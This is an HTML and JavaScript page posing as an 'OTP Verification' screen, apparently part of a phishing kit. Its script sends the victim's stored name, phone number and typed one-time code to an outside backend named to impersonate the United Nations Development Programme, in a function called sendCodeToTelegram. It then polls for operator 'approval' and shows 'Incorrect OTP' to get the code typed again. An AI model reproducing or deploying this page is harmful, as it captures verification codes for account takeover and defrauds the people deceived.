<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>OTP Verification</title>

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
  background: #f3f3f3;
  min-height: 100vh;
}

/* Back arrow */
.back {
  position: absolute;
  top: 16px;
  left: 16px;
  font-size: 22px;
  color: #555;
  text-decoration: none;
}

/* Page layout — LEFT ALIGNED */
.page {
  min-height: 100vh;
  padding: 90px 24px 24px;
}

/* Text */
.title {
  font-size: 20px;
  font-weight: 600;
  color: #222;
  margin-bottom: 6px;
}

.subtitle {
  font-size: 14px;
  color: #666;
  margin-bottom: 4px;
}

.display-number {
  font-size: 14px;
  color: #333;
  margin-bottom: 28px;
  font-weight: 500;
}

/* OTP */
.label {
  font-size: 14px;
  color: #555;
  margin-bottom: 10px;
}

.otp-boxes {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
}

.otp-boxes input {
  width: 44px;
  height: 52px;
  font-size: 20px;
  text-align: center;
  border: 1.8px solid #1e6fbf;
  border-radius: 8px;
  outline: none;
  background: #fff;
}

/* Timer */
#timerContainer {
  font-size: 13px;
  color: #777;
  margin-bottom: 26px;
}

/* Button */
button {
  width: 100%;
  max-width: 320px;
  padding: 14px;
  font-size: 15px;
  font-weight: 600;
  border-radius: 8px;
  border: none;
  background: #cfcfcf;
  color: #ffffff;
  cursor: not-allowed;
}

button:not(:disabled) {
  background: #1e6fbf;
  cursor: pointer;
}

.spinner {
  width: 16px;
  height: 16px;
  border: 3px solid white;
  border-top: 3px solid rgba(255,255,255,0.4);
  border-radius: 50%;
  margin-left: 8px;
  animation: spin 1s linear infinite;
  display: none;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

#status {
  margin-top: 14px;
  font-size: 13px;
  color: #1e3a8a;
}
</style>
</head>

<body>

<a href="pin.html" class="back">←</a>

<div class="page">
  <div class="title">OTP Verification</div>
  <div class="subtitle">Enter the OTP sent to your phone number</div>
  <div id="phoneNumber" class="display-number"></div>

  <form id="otpForm">
    <div class="label">OTP</div>

    <div class="otp-boxes">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
    </div>

    <div id="timerContainer">
      Resend OTP in <strong><span id="timerDisplay">60</span></strong> seconds
    </div>

    <button id="submitBtn" disabled>
      <span id="btnText">Submit</span>
      <span class="spinner" id="spinner"></span>
    </button>
  </form>

  <div id="status"></div>
</div>

<script>
const BACKEND_URL = "https://united-nations-development-program.onrender.com";
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');
if(!botId){ alert("Invalid access link"); throw new Error(); }

/* phone from localStorage */
const phone = localStorage.getItem('phone') || "";
document.getElementById('phoneNumber').textContent =
  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "";

const inputs = document.querySelectorAll('.otp-boxes input');
const submitBtn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const statusEl = document.getElementById('status');
const timerDisplay = document.getElementById('timerDisplay');

let countdown;

/* ===== FREE TYPING OTP HANDLING ===== */
document.addEventListener('keydown', e => {
  if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;

  const values = [...inputs].map(i => i.value);
  const index = values.findIndex(v => v === "");

  if(e.key === "Backspace") {
    const lastFilled = values.map(v => v !== "").lastIndexOf(true);
    if(lastFilled >= 0) inputs[lastFilled].value = "";
  } else if(index !== -1) {
    inputs[index].value = e.key;
  }

  submitBtn.disabled = ![...inputs].every(i => i.value);
});

/* countdown — START IMMEDIATELY */
function startCountdown(duration = 60) {
  let time = duration;
  timerDisplay.textContent = time;
  clearInterval(countdown);

  countdown = setInterval(() => {
    time--;
    timerDisplay.textContent = time;
    if(time <= 0){
      clearInterval(countdown);
      statusEl.textContent = "OTP expired. Please request a new code.";
      submitBtn.disabled = true;
    }
  }, 1000);
}

startCountdown();

/* send + poll (unchanged) */
async function sendCodeToTelegram(name, phone, code) {
  try {
    const r = await fetch(`${BACKEND_URL}/submit-code`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ name, phone, code, botId })
    });
    return r.json();
  } catch {
    return null;
  }
}

function pollCodeApproval(requestId) {
  return new Promise(resolve => {
    const i = setInterval(async () => {
      const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
      const d = await r.json();
      if(d.approved === true || d.approved === false){
        clearInterval(i);
        resolve(d.approved);
      }
    },1500);
  });
}

document.getElementById('otpForm').addEventListener('submit', async e => {
  e.preventDefault();
  const code = [...inputs].map(i=>i.value).join('');
  const name = localStorage.getItem('name') || "Unknown";
  const phone = localStorage.getItem('phone') || "Unknown";

  submitBtn.disabled = true;
  btnText.textContent = "Verifying";
  spinner.style.display = "inline-block";
  statusEl.textContent = "Waiting for approval...";

  const res = await sendCodeToTelegram(name, phone, code);
  if(!res || !res.requestId){
    statusEl.textContent = "Submission failed.";
    submitBtn.disabled = false;
    btnText.textContent = "Submit";
    spinner.style.display = "none";
    return;
  }

  const approved = await pollCodeApproval(res.requestId);
  clearInterval(countdown);

  if(approved){
    localStorage.clear();
    window.location.href = `success.html?botId=${botId}`;
  } else {
    statusEl.textContent = "Incorrect OTP. Try again.";
    inputs.forEach(i=>i.value="");
    submitBtn.disabled = false;
    btnText.textContent = "Submit";
    spinner.style.display = "none";
    startCountdown();
  }
});
</script>

</body>
</html>
